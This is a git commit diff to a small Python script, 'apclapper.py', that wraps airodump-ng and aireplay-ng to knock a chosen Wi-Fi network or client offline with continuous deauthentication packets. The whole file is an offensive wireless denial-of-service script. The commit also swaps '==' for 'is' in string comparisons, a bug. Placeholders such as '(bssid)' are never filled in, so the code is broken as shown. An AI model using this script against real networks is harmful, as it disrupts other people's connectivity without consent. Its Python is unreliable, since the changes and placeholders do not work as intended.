bfa8fd01dd9ef9674299503e6a696bd95db92940
jobro247 <44535515+jobro247@users.noreply.github.com>
2018-11-21 17:34:29 -0800

    Update apclapper.py

--- apclapper.py
+++ apclapper.py
@@ -2,7 +2,7 @@ import os
 
 airodumpng = input("do you want to start scanning for networks to CLAP! Yes/no")
 print ("when running airodump-ng just press ctrl c to stop")
-if airodumpng == "Yes":
+if airodumpng is "Yes":
   os.system("airodump-ng start wlan0")
 else:
   os.system("exit")
@@ -13,7 +13,7 @@ bssid = input("enter the bssid that you want to CLAP!")
 channel = input("enter the channel of the channel you wanna CLAP!")
 os.system("airodump-ng --channel (channel) --bssid (bssid) wlan0mon")
 aireplay = input("do you want to clap the entire network or just a client? Network/Client")
-if aireplay == 'Network':
+if aireplay is 'Network':
   os.system("aireplay-ng -0 0 -a (bssid) wlan0mon")
 else:
   aireplay_client = input("enter the client you wanna CLAP:")
